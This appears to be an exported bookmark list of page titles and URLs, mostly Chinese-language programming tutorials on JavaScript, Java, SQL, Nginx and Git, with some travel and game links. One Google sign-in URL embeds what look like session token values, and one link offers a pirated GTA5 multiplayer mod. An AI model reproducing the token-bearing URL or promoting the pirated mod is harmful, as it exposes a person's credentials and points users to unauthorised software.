弱弱前端碎碎念\nhttp://heyyou.logdown.com/tags/javascript\n\nJavaScript 筆記: function is call by \"value\" or call by \"reference\"? « 弱弱前端碎碎念\nhttp://heyyou.logdown.com/posts/145054\n\nJavascript 閉包 Closure « Guang's Note\nhttp://guang.logdown.com/posts/277383-javascript-closure\n\n闭包 - JavaScript | MDN\nhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Performance_considerations\n\n《你不知道的 JavaScript》整理（一）——作用域、提升與閉包 - 每日頭條\nhttps://kknews.cc/other/6bmzqq.html\n\n首頁 - Myself 動漫 | 日本在線動畫﹑擁有多種視頻由你選擇﹑免費任您收看 - Powered by Discuz!\nhttp://myself-bbs.com/portal.php\n\n不允許存取\nhttps://www.blogger.com/blogin.g?blogspotURL=https://acgeternalstar.blogspot.tw/p/blog-page_50.html\n\nhttps://www.inside.com.tw/2016/09/30/coding-is-over\nhttps://www.inside.com.tw/2016/09/30/coding-is-over\n\nES6 语法实践，用 ES6 重写《JavaScript Patterns》中的设计模式 - CNode 技术社区\nhttps://cnodejs.org/topic/5565b4a77d4c64752effb5dd\n\n《JavaScript 设计模式》PDF 版本下载 - 小木人印象\nhttp://www.xwood.net/_site_domain_/_root/5870/5930/5932/t_c262754.html\n\n頁面載入發生問題\nhttp://pan.baidu.com/s/1i5k2CjN\n\nFire-and-Forget 前端轉貼總部\nhttps://www.facebook.com/groups/F2ETW.share.HQ/\n\nStartup Engineering 新創工程技術筆記\nhttp://blog.kdchang.cc/\n\nJavaScript 程式設計新手村 - Hahow 好學校\nhttps://hahow.in/courses/57d60701ed63880700da234c\n\n17JT202JWM 《保證出發》香草東京瑞江自由行 5 日(含稅/2 人成行) - 雄獅旅遊\nhttp://www.liontravel.com/webpd/webpdsh00.aspx?sProd=17JT202JWM\n\n《保證出發》香草東京瑞江自由行 5 日(含稅/2 人成行) - 雄獅旅遊\nhttp://www.liontravel.com/webpd/webpdsh00.aspx?sKind=1&sProd=TPETYOJW06\n\nWeb Scraping - Code Self Study Wiki\nhttp://codeselfstudy.com/wiki/Web_Scraping\n\n2017 最新！自己辦護照超簡單！第一次申請護照流程(去外交部地圖) - 喬伊斯洛伐克。任意門\nhttps://joyce8.com/apply-for-a-passport/\n\n簡介 · Git\nhttps://zlargon.gitbooks.io/git-tutorial/content/index.html\n\n玩 Wargame 學習 Linux 操作：Bandit (Level 0 - Level 19) « Have a Smile :))\nhttp://hvsimon-lin.logdown.com/posts/960664-wargame-linux-operation-bandit\n\nWargames hack - Google 搜尋\nhttps://www.google.com.tw/search?q=Wargames+hack&oq=Wargames+hack&gs_l=serp.3..0j0i10k1j0i30k1l4j0i5i30k1j0i8i30k1l3.1666.3466.0.3685.5.5.0.0.0.0.332.562.0j2j0j1.3.0....0...1c.1.64.serp..\n2.3.559...0i10i30k1.B1eGJM7V58M\n俠盜獵車手 5 (GTA 5) PC 版圖文攻略 | 娛樂計程車\nhttp://www.entertainment14.net/blog/post/110202884-%E4%BF%A0%E7%9B%9C%E7%8D%B5%E8%BB%8A%E6%89%8B-5-(gta-5)-pc%E7%89%88%E5%9C%96%E6%96%87%E6%94%BB%E7%95%A5\n\nReleases · GTACoop/GTACoop\nhttps://github.com/GTACoop/GTACoop/releases\n\n【已漢化】【最新】gta5 盜版聯機 MOD 親測成功！沒有封殺！不是 FIVEM 和 GTA–MP！@GTA5 俠盜獵車手 5\\_夢遊電玩論壇 - APK 手機遊戲 Iphone 線上遊戲 網頁遊戲 APP 下載\nhttps://www.game735.com/thread-263631-1-1.html\n\nFramerJS Club – Showcase of framerjs prototypes and cool articles\nhttp://framerjs.club/\n\njavascript 变量声明 及作用域 - silentjesse - 博客园\nhttp://www.cnblogs.com/silentjesse/p/4024536.html\n\ndetailyang/awesome-cheatsheet: awesome cheatsheet\nhttps://github.com/detailyang/awesome-cheatsheet#front-end-development\n\nIncrement 1,1,1,2,2,2,3,3,3 - Technical Support - Sublime Forum\nhttps://forum.sublimetext.com/t/increment-1-1-1-2-2-2-3-3-3/15347\n\nAndroid 学习笔记：多个 AsyncTask 实例的并发问题 - 51kata - 博客园\nhttp://www.cnblogs.com/51kata/p/4122655.html\n\n【JSDC 客座文章】企業端如何推動持續整合開發流程 | iThome\nhttp://www.ithome.com.tw/guest-post/98457\n\n图解 Git\nhttps://marklodato.github.io/visual-git-guide/index-zh-cn.html\n\nWallpapers by Makoto Shinkai - Wallpaper Abyss\nhttps://wall.alphacoders.com/unregistered.php?id=3657&lang=Swedish\n\nVue.js + Firebase 動手做 - HackMD\nhttps://hackmd.io/p/HJbgb47N#/\n\ngulp 學習筆記 · GitBook\nhttps://www.gitbook.com/book/kejyuntw/gulp-learning-notes/details\n\nMatch URL patterns with RegEx\nhttps://regex.wtf/url-matching-regex-javascript/\n\n深入解析 CSS Flexbox - OXXO.STUDIO\nhttp://www.oxxostudio.tw/articles/201501/css-flexbox.html\n\n11:15 - 12:00 R1:前端框架大亂鬥 之 我為什麼選擇 Vue.js 2.0 – hackfoldr\nhttp://hackfoldr.org/mopcon2016/https%253A%252F%252Fhackmd.io%252FEwNgHA7AxlwQtABgKYE5HwCwis%252BAjOAQ3gFZSJhkRoBmFAMyA%253D%253D%253D%253Fboth\n\n例外處理 · gulp 學習筆記\nhttps://kejyuntw.gitbooks.io/gulp-learning-notes/content/start/Start-Exception.html\n\n【gulp-notify】gulp 處理通知 · gulp 學習筆記\nhttps://kejyuntw.gitbooks.io/gulp-learning-notes/content/plguins/Tool/Plugins-Tool-gulp-notify.html\n\nTest Corner 第四次聚會 | Flickr\nhttps://www.flickr.com/photos/testcorner/sets/72157669492632172\n\njs 中 undefined，null 和 typeof 运算符 - coodoing - 博客园\nhttp://www.cnblogs.com/ttltry-air/archive/2011/03/24/1993433.html\n\n淺談類型判斷 in JavaScript - Aar0n Huang\nhttp://blog.buginception.com/blog/2013/01/30/type-checking-in-javascript/\n\nITseer - 資訊知識分享 | 程式技術討論: JavaScript true/false 傻傻分不清楚\nhttp://itseer.blogspot.com/2012/04/javascript-truefalse.html\n\n玩者小菩: 寫 JavaScript 時的好習慣(Good Practices)\nhttp://lpc1234kimo.blogspot.com/2010/12/javascriptgood-practices.html\n\nJavascript 的各種陷阱 | Moolog\nhttp://jkmoo.com/wordpress/63/javascript-%E7%9A%84%E5%90%84%E7%A8%AE%E9%99%B7%E9%98%B1/\n\n移除巴哈姆特針對 adblock 做檢測的腳本\nhttps://gist.github.com/aerialis/faaf65a438cb68b61c24a33906b1ee7c\n\nJavaScript - Closure 與 Hoisting\nhttp://cythilya.blogspot.com/2015/05/javascript-patterns-closure-hoisting.html\n\n负载均衡与集群之 nginx+tomcat+memcached - 星空的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/chaofanwei/article/details/12715187\n\n高并发之 Memcached 实战 - CSDN 学院 - CSDN\nhttp://edu.csdn.net/course/detail/484\n\nnginx+tomcat+memcached 构建 session 共享集群 - 信风 - 51CTO 技术博客\nhttp://xsllqs.blog.51cto.com/2308669/1825680\n\nnginx 平台初探(100%) — Nginx 开发从入门到精通\nhttp://tengine.taobao.org/book/chapter_02.html\n\nNginx 反向代理与负载均衡实践 丨 时光不老，我们记得就好\nhttp://www.dockerwy.com/dockewy/36\n\n架构设计：负载均衡层设计方案（7）——LVS + Keepalived + Nginx 安装及配置 - JAVA 入门中 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/yinwenjie/article/details/47211551\n\nNginx+Keepalived 实现站点高可用 | Sean's Notes\nhttp://seanlook.com/2015/05/18/nginx-keepalived-ha/\n\nDocker 研習營 1119 - Google 簡報\nhttps://docs.google.com/presentation/d/1pBBTzAbKAYTDXDE6ZDZzQkFKzFisMPQB8T96o1-N7po/pub?start=false&loop=false&delayms=3000#slide=id.g19613dd9d0_0_746\n\n把 Fiddler 配置成 reverse proxy « 张岭 (Zhang Ling's Blog)\nhttp://www.zhangling.org/blog/20140801/config-fiddler-as-reverse-proxy.html\n\nhttps://zkd.me/blog/debug-https-use-fiddler/\nhttps://zkd.me/blog/debug-https-use-fiddler/\n\n前后端分离的利器：fiddler 的实用功能举例 - p2227 - 博客园\nhttp://www.cnblogs.com/p2227/p/fiddler-practice.html\n\n登入 - Google 帳戶\nhttps://calendar.google.com/accounts/SetOSID?authuser=0&continue=https%3A%2F%2Fcalendar.google.com%2Fcalendar%2Fembed%3Fsrc%3D8lj511li54lc5q2etflo7utof8%2540group.calendar.google.com%26ct\nz%3DAsia%252FTaipei%26pli%3D1%26auth%3DoASOEdrK2y3CSd-3Yl5sc584o5xFz73oGLMeQeOlnmkWRydMeClV6eqebzXlyfe-PZR93w.&osidt=ALWU2ctBSE4NOkxexbNpllo6Q6Y3tpGWX2ZTXPsKmS6EfkOVzXdBESj4tfDwNflfiTxrIRry23wC7HGMaPnW8Hl29OF1yRIlz1lOQQt6LRRZjQTKWLFGaHil3mFXsB4EJH-xHZjqzkDC\n5 款移动开发轻量 jQuery 的替代品 | IT 瘾\nhttp://itindex.net/detail/46441-%E7%A7%BB%E5%8A%A8-%E5%BC%80%E5%8F%91-jquery\n\nPrimeUI\nhttps://www.primefaces.org/primeui/#panelmenu\n\nAsynchronous and deferred JavaScript execution explained « Peter Beverloo\nhttp://peter.sh/experiments/asynchronous-and-deferred-javascript-execution-explained/\n\n关于字体图标在 firefox 上本地访问无法显示的问题分析 - 二两豆腐\nhttps://my.oschina.net/u/2457218/blog/782822\n\nSwagger 初探\nhttp://www.lilinjian.com/web/2015/12/25/swagger.html\n\npostman 中 form-data、x-www-form-urlencoded、raw、binary 的区别 - wangjun5159 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/wangjun5159/article/details/47781443\n\njquery - How can get length on checked checkbox array javascript - Stack Overflow\nhttp://stackoverflow.com/questions/15110437/how-can-get-length-on-checked-checkbox-array-javascript\n\n用 lodash 替换掉 Underscore*岁月静好\\_sam*新浪博客\nhttp://blog.sina.com.cn/s/blog_7035c6ac0102w9ym.html\n\njavascript - QUnit - test in loop, index always the same - Stack Overflow\nhttp://stackoverflow.com/questions/36021953/qunit-test-in-loop-index-always-the-same\n\nLagacy Project - 重構心得 « fall1600\nhttp://fall1600.logdown.com/posts/1159901\n\nINFORMATION_SCHEMA.COLUMNS\nhttps://www.mssqltips.com/sqlservertutorial/183/informationschemacolumns/\n\nSETTIMEOUT 使用閉包功能,實現定時列印數值 - 壹讀\nhttps://read01.com/Oy5A.html\n\nMOTC Helper\nhttp://ptx.transportdata.tw/MOTC/Swagger/#!/Account/Account_Login\n\n网页模板,网站模板,DIV+CSS 模板,企业网站模板下载-模板之家\nhttp://www.cssmoban.com/\n\n网页中图片旋转的几种实现方式 - rentj - 博客园\nhttp://www.cnblogs.com/rentj1/archive/2012/10/13/2722124.html\n\nmrkt 的程式學習筆記: jQuery 練習題 : 圖片即時縮圖並裁剪顯示為正方形\nhttp://kevintsengtw.blogspot.com/2012/05/jquery.html\n\n图片(旋转/缩放/翻转)变换效果(ccs3/滤镜/canvas) - cloudgamer - 博客园\nhttp://www.cnblogs.com/cloudgamer/archive/2010/08/16/ImageTrans.html\n\nCSS3 Filter 的十种特效\\_filter 教程\\_w3cplus\nhttp://www.w3cplus.com/css3/ten-effects-with-css3-filter\n\nJSTL If With Logical Operator And/Or : If « JSTL « Java Tutorial\nhttp://www.java2s.com/Tutorial/Java/0380__JSTL/JSTLIfWithLogicalOperatorAndOr.htm\n\ncss – SUSY2 教學範例 – 基本 | jsnWork\nhttp://jsnwork.kiiuo.com/archives/1509/css-susy2-%E6%95%99%E5%AD%B8\n\nhttp://jas9.blogspot.com/2011/09/pxemrem.html\nhttp://jas9.blogspot.com/2011/09/pxemrem.html\n\n徹底理解 UI 及 Web 的尺寸單位：基本觀念 – UXabc – Medium\nhttps://medium.com/uxabc/understanding-ui-units-8acdc0575388#.nzpwg9rkl\n\nPHP 5.3、5.4、5.5、5.6 中的新特性 - 风逐蓝天's Blog - SegmentFault\nhttps://segmentfault.com/a/1190000002790818\n\nDevOps：持續整合＆持續交付（Docker、CircleCI、AWS）\nhttp://blog.amowu.com/2015/04/devops-continuous-integration-delivery-docker-circleci-aws-beanstalk.html\n\nLee Bor-Jian | 數學教師 | Udemy\nhttps://www.udemy.com/user/e3inqhwawxzw/\n\nScapy 網路封包分析工具 - John's Lin Blog\nhttp://linton.tw/2013/10/18/scapy-network-packet-analysis-tool/\n\ncmder 中文显示相关问题解决方案(1.3 以上版本) | Wentao\nhttp://wentaoma.com/2016/08/31/cmder-chinese-encode/\n\nSASS Cheat Sheet\nhttps://sass-cheatsheet.brunoscopelliti.com/\n\ncss2sass | Convert CSS Snippets to Syntactically Awesome StyleSheets code\nhttp://css2sass.herokuapp.com/\n\n如何當個能讓設計師好好設計的前端工程師 by Denny Ku\nhttp://slides.com/dennyku/deck-5-6#/6/24\n\n白鼠筆記\nhttp://classroom.sliiice.com/\n\n沒有符合條件的頁面。 – 我的博客\nhttp://junnnnj.com/uncategorized/sass-variables-%E9%A1%8F%E8%89%B2%E5%91%BD%E5%90%8D/\n\n如何解决 inline-block 元素的空白间距\\_inline-block 教程\\_w3cplus\nhttp://www.w3cplus.com/css/fighting-the-space-between-inline-block-elements\n\nParallax with Greensock Tweenlite\nhttp://codepen.io/planetgrafix/pen/bcEhe\n\nGit-rebase 小筆記 - Yu-Cheng Chuang’s Blog\nhttps://blog.yorkxin.org/2011/07/29/git-rebase\n\nweb tech topic - YouTube\nhttps://www.youtube.com/results?search_query=web+tech+topic\n\n[Git] Reset - mixed, hard and soft | 搞搞就懂 - 點部落\nhttps://dotblogs.com.tw/wasichris/2016/04/29/225157\n\nError 404 (Not Found)!!1\nhttp://webcache.googleusercontent.com/search?q=cache:TM56ObJ6f9kJ:www.fcxos.com/index.php/Index/blog/view/12&num=1&hl=zh-TW&gl=tw&strip=1&vwsrc=0\n\n译~GreenSock 动画平台(GSAP)的 JavaScript 版本入门 - 程序园\nhttp://www.voidcn.com/blog/kaizi524/article/p-4923483.html\n\nWu Jack - YouTube\nhttps://www.youtube.com/user/JackWuSEO\n\n旅旅 | 500 Error\nhttp://tw.tavitavi.com/articles/7\n\nhttp://ncrblue.pixnet.net/blog/post/41351449-sega-%E6%9D%B1%E4%BA%ACjoypolis-\nhttp://ncrblue.pixnet.net/blog/post/41351449-sega-%E6%9D%B1%E4%BA%ACjoypolis-\n\n領域驅動設計 (Domain Driven Design)\nhttps://www.slideshare.net/regionbbs/domain-driven-design-63466068\n\nSweetAlert\nhttp://t4t5.github.io/sweetalert/\n\n天空的垃圾場\nhttp://skychang.github.io/\n\n@川原礫 作品集 哈啦板 - 巴哈姆特\nhttps://forum.gamer.com.tw/C.php?bsn=42388&snA=13731&tnum=2\n\n免費 DDNS 服務 – Linux 技術手札\nhttps://www.phpini.com/internet/free-ddns\n\n[ASP.NET WebApi]使用 JWT 進行 web api 驗證 | 全端開發人員天梯 - 點部落\nhttps://dotblogs.com.tw/wellwind/2016/11/24/jwt-auth-web-api\n\nNot Found – Medium\nhttps://blog.25sprout.com/2015/03/fixed_ie8_tech/?gi=837e1cdfcb6a\n\n//Sublime Text Love\nhttp://sublimetextlove.tumblr.com/\n\n\nDB2 OLAP 函數的使用 @ 資訊園 :: 痞客邦 PIXNET ::\nhttp://fecbob.pixnet.net/blog/post/38193247-db2-olap%E5%87%BD%E6%95%B8%E7%9A%84%E4%BD%BF%E7%94%A8\n\nDB2 中如何實現 Oracle 的相關功能 - chinayuan 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/chinayuan/article/details/3469799\n\n昭佑.天翔: Oracle Select SQL Tuning 查詢效能調整\nhttp://tomkuo139.blogspot.tw/2009/08/oracle-select-sql-tuning.html\n\n日期格式化{0:yyyy-MM-dd HH:mm:ss.fff}和{0:yyyy-MM-dd hh:mm:ss.fff}的区别 - 唔愛吃蘋果 - 博客园\nhttp://www.cnblogs.com/jhxk/articles/1618194.html\n\n一款简单的 jquery json 对象发送服务器端接收实例-Java 基础-Jsp 教程-壹聚教程网\nhttp://www.111cn.net/jsp/Java/36017.htm\n\n\n[jQuery] 如何為 DatePicker 加上中文化日期選項？ – 藏經閣\nhttp://blog.e-happy.com.tw/?p=5011\n\n小信豬的原始部落: Java 學習筆記 (10) - Reflection\nhttp://godleon.blogspot.com/2007/09/class-class-java-class-class-jvm-class.html\n\njsPerf: JavaScript performance playground\nhttps://jsperf.com/\n\nDB2 日期與時間型別操作 @ vic 的隨手筆記 :: 隨意窩 Xuite 日誌\nhttp://blog.xuite.net/mpsky/myblog/23838369-DB2+%E6%97%A5%E6%9C%9F%E8%88%87%E6%99%82%E9%96%93%E5%9E%8B%E5%88%A5%E6%93%8D%E4%BD%9C\n\n程式倉庫: JSP & Servlet JSTL 使用簡介\nhttp://vencilcodestore.blogspot.tw/2010/08/jsp-servlet-jstl.html\n\njava - How to iterate an ArrayList inside a HashMap using JSTL? - Stack Overflow\nhttp://stackoverflow.com/questions/2117557/how-to-iterate-an-arraylist-inside-a-hashmap-using-jstl\n\nJANGS'S KM\nhttp://www.wfps.tp.edu.tw/eip/jangs/index2.asp?mid=17&sid=showdata&did=135\n\nJWorld@TW Java 論壇 - request 的 setAttribute 問題\nhttps://www.javaworld.com.tw/jute/post/view?bid=6&id=86216&tpg=1&ppg=1&sty=1&age=0#86216\n\ndatabase - What are the query browsers for DB2? - Stack Overflow\nhttp://stackoverflow.com/questions/8381345/what-are-the-query-browsers-for-db2\n\n从 jQuery 的 ajax 请求中删除 X-Requested-With - ruipheng 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/ruipheng/article/details/17263517\n\ndream-hua.net -  这个网站可出售。 -  最佳的 dream-hua 来源和相关信息。\nhttp://ww1.dream-hua.net/\n\nSublime Text shortcut – convert to lowercase/uppercase | Lysender's Daily Log Book\nhttps://blog.lysender.com/2013/05/sublime-text-shortcut-convert-to-lowercaseuppercase/\n\nLog4J 依不同 class 產出不同 log file @ Jemmy Walker :: 痞客邦 PIXNET ::\nhttp://jemmywalker.pixnet.net/blog/post/38324083-log4j%E4%BE%9D%E4%B8%8D%E5%90%8Cclass%E7%94%A2%E5%87%BA%E4%B8%8D%E5%90%8Clog-file\n\n[JAVA] Log4J @ 過太爽的日子 :: 隨意窩 Xuite 日誌\nhttp://blog.xuite.net/chihho32/blog/9121126-%5BJAVA%5D+Log4J\n\nTop 10 Tips on Logging in Java - Tutorial\nhttp://javarevisited.blogspot.tw/2011/05/top-10-tips-on-logging-in-java.html\n\nDB2 命令寶典 @ 資訊園 :: 痞客邦 PIXNET ::\nhttp://fecbob.pixnet.net/blog/post/38199613-db2-%E5%91%BD%E4%BB%A4%E5%AF%B6%E5%85%B8\n\nSublime Text 2 快捷键 (windows) - Cat 的日志 - 网易博客\nhttp://istyles.blog.163.com/blog/static/1811003892011828111418654/\n\nOrganization Chart  |  Charts  |  Google Developers\nhttps://developers.google.com/chart/interactive/docs/gallery/orgchart?csw=1#Example\n\nJerryQu 的小站\nhttps://imququ.com/\n\nJWorld@TW Java 論壇 - How can i save JTextPane content in jpg file\nhttps://www.javaworld.com.tw/jute/post/view?bid=5&id=108955&sty=1&tpg=1&age=0\n\npotatoes and carrots no bones: JAVA: Convert Image to Base64 String and Base64 String to Image\nhttp://ben-bai.blogspot.com/2012/08/java-convert-image-to-base64-string-and.html\n\n家系圖 @ 宜寧居家護理所 :: 隨意窩 Xuite 日誌\nhttp://blog.xuite.net/home.care/homecare/21172623-%E5%AE%B6%E7%B3%BB%E5%9C%96\n\nSaving a Java 2d graphics image as .png file - Stack Overflow\nhttp://stackoverflow.com/questions/8202253/saving-a-java-2d-graphics-image-as-png-file\n\nJT∞l Draw 家系圖工具\nhttp://tool.imjerry.net/\n\n松露筆管麵: 使用 javascript ShowModalDialog\nhttp://trufflepenne.blogspot.tw/2013/05/javascript-showmodaldialog.html\n\nWindy, Windyty, Windytv. Wind map & weather forecast\nhttps://www.windy.com/?23.500,121.000,2\n\nIE7、IE8、IE9 相容性檢視瀏覽網頁與 Quirks 模式的問題 @ 小雕雕的家 :: 痞客邦 PIXNET ::\nhttp://sweeteason.pixnet.net/blog/\npost/39920453-ie7%E3%80%81ie8%E3%80%81ie9-%E7%9B%B8%E5%AE%B9%E6%80%A7%E6%AA%A2%E8%A6%96%E7%80%8F%E8%A6%BD%E7%B6%B2%E9%A0%81%E8%88%87-quirks-%E6%A8%A1%E5%BC%8F\nPenguin 工作室，一起 JAVA 吧！ :: 隨意窩 Xuite 日誌\nhttp://blog.xuite.net/jane17512001/PenguinDesign\n\nwww.tamabc.com | 520: 源站返回未知错误\nhttp://www.tamabc.com/article/84939.html\n\nJava 的字串\nhttps://openhome.cc/Gossip/Encoding/String.html\n\nObject comparison in JavaScript - Stack Overflow\nhttp://stackoverflow.com/questions/1068834/object-comparison-in-javascript\n\nDrawing lines with a mouse - JSFiddle\nhttp://jsfiddle.net/URWru/\n\nURL Regular expression @ Vexed's Blog :: 隨意窩 Xuite 日誌\nhttp://blog.xuite.net/vexed/tech/46146920-URL+Regular+expression\n\n網頁標籤 <frame> 與 <iframe> 簡單說 @ 女生愛科技 :: 痞客邦 PIXNET ::\nhttp://girllovesdtech.pixnet.net/blog/post/51415186-%E7%B6%B2%E9%A0%81%E6%A8%99%E7%B1%A4-%3Cframe%3E-%E8%88%87-%3Ciframe%3E-%E7%B0%A1%E5%96%AE%E8%AA%AA\n\n404 Not Found\nhttp://chance-ms.com/%E6%9C%80%E8%BF%91%E5%AF%AB%E7%9A%84%E7%B6%B2%E7%AB%99%E9%81%87%E5%88%B0%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C-ie%E8%A3%A1%E7%9A%84iframe-%E4%B8%8D%E6%94%AF%E6%8F%B4jqu\nery1-10-1/\n不換頁技術的介紹\nhttp://webcache.googleusercontent.com/search?q=cache:J7du_K0HeRAJ:josephj.com/prototype/JosephJiang/Presentation/NoPostBack/demo.html+&cd=13&hl=zh-TW&ct=clnk&gl=tw\n\n\n[請益] 有無比較程式碼差異性的軟體 - 看板 EZsoft - 批踢踢實業坊\nhttps://www.ptt.cc/bbs/EZsoft/M.1206767410.A.CAD.html\n\nhttp://www.finereport.com/tw/knowledge/acquire/jasperreportsireport.html\nhttp://www.finereport.com/tw/knowledge/acquire/jasperreportsireport.html\n\nwebservice - 什么是 RESTful ？到底 REST 和 SOAP、RPC 有何区别？ - SegmentFault\nhttps://segmentfault.com/q/1010000003064904\n\n[Pre-Class]SOAP-RPC | 宅學習 - Social Learning Space\nhttps://sls.weco.net/blog/keooen/18-may-2007/3743\n\npython - Pythonic Circular List - Stack Overflow\nhttp://stackoverflow.com/questions/8951020/pythonic-circular-list\n\naureooms/js-itertools API Document\nhttp://aureooms.github.io/js-itertools/\n\nHandling Keyboard Shortcuts in JavaScript\nhttp://www.openjs.com/scripts/events/keyboard_shortcuts/\n\nAbout (Command Line)\nhttps://msdn.microsoft.com/zh-tw/library/y5e47585(v=vs.80).aspx\n\nwin8 網路芳鄰/網鄰 區網共用該如何登出帳號 @ 【R 記錄】 :: 隨意窩 Xuite 日誌\nhttp://blog.xuite.net/sunnysoap/\nr/150810217-win8%E7%B6%B2%E8%B7%AF%E8%8A%B3%E9%84%B0%2F%E7%B6%B2%E9%84%B0+%E5%8D%80%E7%B6%B2%E5%85%B1%E7%94%A8%E8%A9%B2%E5%A6%82%E4%BD%95%E7%99%BB%E5%87%BA%E5%B8%B3%E8%99%9F\nEmEditor 說明\nhttp://www.emeditor.org/zh-tw/index.html\n\n用 MSBuild 完成 Daily Build 工作! | 心牆記事\nhttps://lex0912.wordpress.com/2006/02/18/%e7%94%a8msbuild%e5%ae%8c%e6%88%90daily-build%e5%b7%a5%e4%bd%9c/\n\nCommand Line Commands\nhttps://msdn.microsoft.com/zh-tw/library/003ssz4z(v=vs.80).aspx\n\nlanguage agnostic - Getting parts of a URL (Regex) - Stack Overflow\nhttp://stackoverflow.com/questions/27745/getting-parts-of-a-url-regex\n\ngetRemoteAddr()和 getRemoteHost() 区别 - tanyit 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/tanyit/article/details/6925317\n\nJSP 开发中 request 对象 URL 方法对照表\nhttp://www.360doc.com/content/09/0310/11/18042_2765380.shtml\n\n[javascript]自動補 0 @ 資訊園 :: 痞客邦 PIXNET ::\nhttp://fecbob.pixnet.net/blog/post/43057789-%5Bjavascript%5D%E8%87%AA%E5%8B%95%E8%A3%9C0\n\nselect 下拉選單有像 input 的 READONLY 功能嗎？？- 藍色小舖 BlueShop\nhttp://www.blueshop.com.tw/board/FUM20041006152641OLG/BRD20060120131403ULG.html\n\ngetRequestURI,getRequestURL 的区别 - 草原和大树 - 博客园\nhttp://www.cnblogs.com/JemBai/archive/2010/11/10/1873764.html\n\nwebsphere 错误备忘录 - ITPUB 论坛－中国最专业的 IT 技术社区 - Powered by Discuz!\nhttp://www.itpub.net/forum.php?mod=viewthread&action=printable&tid=737720\n\nIT 隨筆: 二維陣列@Javascript\nhttp://leancoding.blogspot.tw/2008/01/javascript_20.html\n\nJavaScript 判斷輸入日期格式是否為 YYYY/MM/DD\nhttp://www.eion.com.tw/Blogger/?Pid=1047\n\n....................: 判斷日期是否合法\nhttp://evabow.blogspot.tw/2008/12/blog-post_31.html\n\nJava 集合系列 11 之 Hashtable 详细介绍(源码解析)和使用示例 - 如果天空不死 - 博客园\nhttp://www.cnblogs.com/skywang12345/p/3310887.html\n\njQuery .data()與.attr()筆記兩則 - 黑暗執行緒\nhttp://blog.darkthread.net/post-2011-10-25-jquery-data-attr-notes.aspx\n\n響應式網頁設計 Responsive Web Design - 貼文\nhttps://www.facebook.com/permalink.php?id=425857327476777&story_fbid=750765554985951\n\nkendoui 导出 pdf 中文变方块有解决办法么？-开发者论坛 - Powered by Discuz!\nhttp://www.dxper.net/thread-4299-1-1.html\n\nEclipse 解決導出 apk 時 strings.xml 發生錯誤的問題 @ Yang 的部落格 :: 痞客邦 PIXNET ::\nhttp://oblivious9.pixnet.net/blog/post/61286619-eclipse%E8%A7%A3%E6%B1%BA%E5%B0%8E%E5%87%BAapk%E6%99%82strings.xml%E7%99%BC%E7%94%9F%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%95%8F%E9%A1%8C\n\nBest HTML and CSS Cheat Sheets » CSS Author\nhttp://www.cssauthor.com/html-and-css-cheat-sheets/\n\njQuery :: plugin :: 中文、英數字 bytes 計算與驗證 - JSFiddle\nhttp://jsfiddle.net/yelmous/gzub1xoz/\n\n只需要懂 Jquery 也能學 react js\nhttps://www.slideshare.net/JustinWu13/j-queryreact-js\n\npatw0929/jquery.chineselengthlimit: 這是一個可以限制 文字框（input[type='text']） 與 文字輸入區域（textarea） 輸入 中英文字數 的 jQuery Plugin。\nhttps://github.com/patw0929/jquery.chineselengthlimit\n\njQuery Chinese Characters Length Limit Plugin 1.0 - Partner Studio\nhttps://blog.patw.me/archives/615/jquery-chinese-characters-length-limit-plugin-1-0/\n\nPChome 線上購物 -\nhttp://24h.pchome.com.tw/prod/DAAO09-A9005S8HX\n\n居米の筆記: [Javascript]如何讓 IE9, IE8, IE7, IE6 關閉視窗時不彈出對話訊息\nhttp://coding-online.blogspot.tw/2011/12/javascriptie9-ie8-ie7-ie6.html\n\n\njavascript 取得 radio 的值 | [lifeIs: tooShort to: waste]\nhttps://blog.hsin.tw/2008/javascript-form-radio/\n\nStanley's 部落格: DB2 日期時間相減\nhttp://stanleyjian.blogspot.tw/2015/03/db2.html\n\nabout:blank\nabout:blank\n\nWeb Worker 經驗分享(一) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天\nhttp://ithelp.ithome.com.tw/articles/10118851\n\nhttp://mtrsoftware.com.tw/Page_L/ICD9.htm\nhttp://mtrsoftware.com.tw/Page_L/ICD9.htm\n\n人生七劃: SQL 教學\nhttp://kareslion.blogspot.com/search/label/SQL%E6%95%99%E5%AD%B8\n\n未來時間計算\nhttps://www.ifreesite.com/calculatortool/date.htm\n\nhttpbin(1): HTTP Client Testing Service\nhttps://httpbin.org/\n\nSQL 子句执行顺序和 Join 的一点总结 - BobLiu - 博客园\nhttp://www.cnblogs.com/liuzhendong/archive/2011/10/27/2226805.html\n\n兼愛非攻~: SELECT 基礎 2[子查詢與查詢多個資料來源]\nhttp://mohist1.blogspot.tw/2014/10/select-2.html\n\nSQL 中 left join 中 on 和 where 的执行顺序解析*FANtastic*新浪博客\nhttp://blog.sina.com.cn/s/blog_6826662b0101atu1.html\n\nJava 程式教學甘仔店: [MySQL]執行順序與效率概論\nhttp://pclevin.blogspot.tw/2011/12/mysql_24.html\n\n茫茫網海中的冷日 - [轉貼]MSSQL Join 總結\nhttp://www.coolsun.idv.tw/modules/xhnewbb/viewtopic.php?topic_id=1320\n\nSQL JOIN 語法順序與效能之推論 | InspireGate 派克空間\nhttp://inspiregate.com/programming/mysql/303-sql-join-syntax-and-performance-of-inference-in-order.html\n\n[教學]如何在 Windows 上使用 Sublime Text 2 編譯 Java 檔案？ | 香港三兄弟部落格 - 3Bro Blog HK | 香港 IT 部落格 | 電腦、軟件、網絡及智能手機最新資訊\nhttps://blog.3bro.info/archives/windows-compile-java-sublime-text/\n\nhttp://www.searchstarters.com/?dn=erufa.com&pid=9PO1NMIEC\nhttp://www.searchstarters.com/?dn=erufa.com&pid=9PO1NMIEC\n\nJSP 中一些有關網址的資訊 @ 吉米兔的學習園地 :: 隨意窩 Xuite 